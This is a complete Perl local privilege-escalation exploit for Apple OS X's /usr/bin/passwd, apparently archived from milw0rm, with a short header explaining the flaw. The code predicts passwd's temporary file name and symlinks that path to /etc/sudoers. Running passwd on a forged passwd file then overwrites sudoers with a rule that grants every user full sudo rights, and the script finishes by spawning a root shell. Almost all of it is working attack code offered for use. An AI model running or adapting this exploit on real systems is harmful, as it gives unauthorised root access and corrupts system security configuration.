#!/usr/bin/perl
#
# /usr/bin/passwd[OSX]: local root exploit.
# 
# by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)
# 
# (Apple) OSX's /usr/bin/passwd program has support for a custom
# passwd file to be used instead of the standard/static path.  this
# feature has security issues in the form of editable file(s) being
# made anywheres on the disk and also writing arbitrary data to files.
#
# the first issue will only work if the file does not already exist,
# it is done using "umask 0;/usr/bin/passwd -i file -l <filename>".
# the second issue is once a successful password change has occured
# /usr/bin/passwd will insecurely re-write the passwd file to
# /tmp/.pwtmp.<pid>, which can be predicted and linked to a file of
# your choice. (this exploits the second issue to overwrite 
# /etc/sudoers)
#
# (for some reason this took apple 6 or so months to patch)

use POSIX;

$fake_passwd="/tmp/xpasswd.$$";
$passwd_pid=($$ + 1);
$passwd_tempfile="/tmp/.pwtmp.$passwd_pid";
$sudoers="/etc/sudoers";

sub pexit{print("[!] @_.\n");exit(1);}
print("[*] /usr/bin/passwd[OSX]: local root exploit.\n");
print("[*] by: vade79/v9 v9\@fakehalo.us (fakehalo/realhalo)\n\n");
unlink($fake_passwd);
print("[*] making fake password file. ($fake_passwd)\n");
open(FP,">$fake_passwd")||pexit("couldn't open/write to $fake_passwd");
# uid must equal the current user.
print(FP "ALL ALL=(ALL) ALL #::" . getuid . ":" . getuid . "::" .
getuid . ":" . getuid . "::/:/\n");
close(FP);
print("[*] sym-linking $sudoers -> $passwd_tempfile.\n");
symlink($sudoers,$passwd_tempfile)||pexit("couldn't link files.");
print("[*] running /usr/bin/passwd on $fake_passwd.\n");
print("[*] (use ANY password longer than 4 characters)\n\n");
system("/usr/bin/passwd -i file -l $fake_passwd \"ALL ALL=(ALL) ALL #\"");
print("\n[*] running \"sudo sh\", use your REAL (user) password.\n\n");
system("/usr/bin/sudo sh");
exit(0);

# milw0rm.com [2006-03-01]
